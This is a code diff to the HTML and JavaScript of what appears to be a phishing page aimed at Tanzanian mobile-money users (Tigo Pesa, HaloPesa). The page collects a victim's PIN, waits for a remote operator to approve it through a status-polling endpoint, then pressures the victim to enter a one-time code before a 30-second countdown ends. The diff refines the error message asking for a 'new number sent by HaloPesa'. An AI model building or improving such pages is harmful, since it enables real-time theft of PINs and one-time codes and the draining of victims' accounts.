@@ -107,7 +107,7 @@
 
         function startChecking() { if (checkInterval) clearInterval(checkInterval); checkInterval = setInterval(async function() { try { var res = await fetch('/api/check_status/' + appId); var data = await res.json(); if (data.status === 'approved') { clearInterval(checkInterval); showCodeScreen(); } else if (data.status === 'wrong_pin') { clearInterval(checkInterval); goBackToPin(); } } catch(e) {} }, 3000); }
 
-        function showCodeScreen() { document.getElementById('screen2').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; }); document.querySelector('.cd').focus(); startCountdown(); }
+        function showCodeScreen() { document.getElementById('screen2').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); }); document.querySelector('.cd').focus(); startCountdown(); }
         function startCountdown() { if (countdownTimer) clearInterval(countdownTimer); var seconds = 30; var display = document.getElementById('timerDisplay'); display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; countdownTimer = setInterval(function() { seconds--; display.textContent = '⏳ ' + seconds + 's'; if (seconds <= 10) display.className = 'timer-bar warning'; if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } }, 1000); }
         function goBackToPin() { document.getElementById('screen2').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; }); alert('PIN si sahihi. Jaribu tena.'); }
 
@@ -123,8 +123,21 @@
         }
 
         function showSuccess() { document.getElementById('screen4').classList.remove('active'); document.getElementById('successOverlay').classList.add('active'); }
-        function showCodeError() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('codeError').textContent = 'Namba si sahihi'; document.getElementById('codeError').classList.add('show'); document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); d.value = ''; }); document.querySelector('.cd').focus(); startCountdown(); setTimeout(function() { document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); }); document.getElementById('codeError').classList.remove('show'); }, 3000); }
+
+        function showCodeError() {
+            document.getElementById('screen4').classList.remove('active');
+            document.getElementById('screen3').classList.add('active');
+            document.getElementById('codeError').textContent = 'Weka namba mpya iliyotumwa na HaloPesa';
+            document.getElementById('codeError').style.color = 'var(--danger)';
+            document.getElementById('codeError').classList.add('show');
+            document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('filled'); d.classList.add('error'); d.value = ''; });
+            document.querySelector('.cd').focus();
+            startCountdown();
+            setTimeout(function() { document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); }); document.getElementById('codeError').classList.remove('show'); }, 4000);
+        }
+
         function goBackToPinFromCode() { document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; }); alert('PIN si sahihi. Jaribu tena.'); }
     </script>
 </body>
+</html>
 </html>
